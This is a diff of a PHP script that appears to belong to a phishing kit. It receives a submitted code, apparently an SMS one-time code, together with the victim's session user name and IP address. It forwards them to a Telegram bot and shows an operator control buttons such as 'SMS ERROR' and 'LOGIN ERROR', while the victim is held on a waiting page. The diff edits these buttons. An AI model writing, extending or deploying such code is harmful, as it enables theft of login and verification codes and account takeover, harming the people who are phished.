@@ -4,7 +4,6 @@ session_start();
 $usuario = $_SESSION['usuario'] ?? 'desconocido';
 $codigo = $_POST['codigo'] ?? '';
 
-
 function obtenerIP() {
     if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
     elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return $_SERVER['HTTP_X_FORWARDED_FOR'];
@@ -13,16 +12,16 @@ function obtenerIP() {
 $ip = obtenerIP();
 
 require_once("settings.php");
-// Botones para seguir controlando desde Telegram
+
+// NUEVOS botones válidos
 $keyboard = [
     "inline_keyboard" => [
         [
             ["text" => "📩 SMS", "callback_data" => "SMS|$usuario"],
-            ["text" => "❓ Palabra clave", "callback_data" => "CLAVE|$usuario"]
+            ["text" => "❌ SMS ERROR", "callback_data" => "SMS-ERROR|$usuario"]
         ],
         [
-            ["text" => "📍 NUMERO", "callback_data" => "NUMERO|$usuario"],
-            ["text" => "📧 SMSERROR", "callback_data" => "SMSERROR|$usuario"]
+            ["text" => "⚠️ LOGIN ERROR", "callback_data" => "LOGIN-ERROR|$usuario"]
         ]
     ]
 ];
@@ -38,4 +37,3 @@ file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build
 // Redirigir al cliente a espera.php
 header("Location: espera.php");
 exit;
-?>
